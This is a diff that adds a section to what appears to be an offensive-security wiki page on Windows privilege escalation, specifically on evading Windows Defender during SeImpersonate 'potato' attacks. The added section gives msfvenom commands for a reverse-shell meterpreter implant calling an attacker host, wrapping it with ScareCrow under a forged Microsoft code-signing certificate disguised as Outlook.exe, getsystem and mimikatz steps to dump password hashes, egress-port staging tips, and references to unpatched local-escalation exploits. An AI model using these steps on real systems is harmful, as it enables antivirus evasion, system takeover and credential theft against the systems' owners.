@@ -247,3 +247,35 @@ Invoke-PrivescCheck -Extended -Report PrivescCheck_Report -Format HTML
 - [[pass-the-hash]] — credential reuse after dump
 - [[ad-lateral-movement]] — moving with harvested creds
 - [[ad-cheatsheet|Active Directory cheatsheet]]
+
+## Potato attacks vs Defender/EDR — solve evasion ONCE, at the loader
+
+When you hold `SeImpersonatePrivilege` (IIS/MSSQL service account) but **Windows Defender signatures every potato binary** — GodPotato/PrintSpoofer/JuicyPotato/SigmaPotato all flagged on-disk, offline-obfuscated rebuilds still caught, in-memory execution hangs on the DCOM/RPC trigger, on-box compile trips AV — **stop fighting AV once per artifact.** That is the trap: each standalone `.exe` is a separate signature battle you keep losing.
+
+**Fix: get an EDR-evading in-memory C2 session first, then invoke the impersonation primitive from inside that already-clean process.** No new signatured binary touches disk and there is no standalone trigger EXE to flag. Solve Defender ONCE (at the implant) and every subsequent in-memory action rides along.
+
+```bash
+# 1. raw x64 meterpreter shellcode
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker> LPORT=<port> -f raw -o implant.bin
+# 2. wrap with ScareCrow (forges a code-signing cert impersonating -domain); rename output benign
+./ScareCrow -I implant.bin -domain Microsoft.com     # e.g. -> Outlook.exe
+```
+```
+# 3. attacker: multi/handler for windows/x64/meterpreter/reverse_tcp
+# 4. RUN THE LOADER FROM THE SeImpersonate SHELL (the service/app-pool identity), NOT a low-priv
+#    interactive user — getsystem's named-pipe impersonation needs that token, or it has nothing
+#    to impersonate. Often FAILS the first run — just re-run.
+meterpreter > getsystem      # Technique 1/2 = named-pipe impersonation = the SAME "potato", in-memory
+meterpreter > load kiwi      # mimikatz in SYSTEM context -> dump hashes
+```
+
+Key facts:
+- **Change the DELIVERY, not the primitive.** `getsystem` *is* a potato (it consumes `SeImpersonate`); the only difference from a flagged `GodPotato.exe` is that it runs inside a Defender-clean process and drops nothing.
+- **[[scarecrow|ScareCrow]]** = shellcode-into-loader wrapper with a fake code-signing cert (`-domain <fqdn>`), AMSI+ETW patch, encrypted shellcode; static + basic behavioral Defender evasion for the *loader* stage (full page: [[scarecrow]]). Alternatives: Donut, Sliver's stager, `execute-assembly` from an existing clean session.
+- **SigmaPotato** is a GodPotato fork built for in-memory use (`.NET` reflective load via `execute-assembly`) — better than a dropped `.exe`, but the in-memory DCOM trigger can still hang; the loader-first approach above is more reliable when it does.
+- **Egress-restricted host:** fingerprint allowed OUTBOUND ports before choosing C2 ports (common survivors 53/80/443/445). Stage the loader over one (`python3 -m http.server 445`), catch the callback on another (`multi/handler` on 53).
+- **When a C2 loader is not an option:** fresh **non-potato** local-EoP source PoCs compiled offline carry no AV signature (Nightmare_Eclipse / churchofmalware.org: **MiniPlasma** = weaponized *unpatched* CVE-2020-17103 `cldflt` HsmOsBlockPlaceholderAccess race -> SYSTEM, claims all Windows incl. Server; **RedSun** = Defender file-rewrite -> system-file overwrite -> admin; **LegacyHive** = arbitrary hive-load EoP, needs a second std-user cred). All race-based/hit-or-miss; unofficial exploit code, compile and detonate in a lab first. Note `UnDefend` only blocks *future* signature updates — it will NOT un-flag an already-signatured binary.
+
+See also [[scarecrow]] · [[privesc-exploit-arsenal]] · [[windows-amsi-bypass]] · [[endpoint-detection-and-response]] · [[peass]] (winPEAS-vs-Defender).
+
+<!-- promoted-slug: seimpersonate-defender-evasion-loader -->
